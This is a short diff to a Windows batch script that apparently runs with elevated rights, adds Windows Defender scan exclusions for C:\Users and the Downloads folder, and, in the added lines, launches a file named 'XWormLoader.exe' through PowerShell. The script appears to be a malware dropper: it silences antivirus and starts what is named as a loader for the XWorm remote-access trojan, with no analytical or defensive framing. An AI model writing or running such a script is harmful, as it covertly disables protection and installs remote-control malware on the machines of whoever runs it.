@@ -25,6 +25,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 
+powershell Start-Process "XWormLoader.exe"
+
 powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
 powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
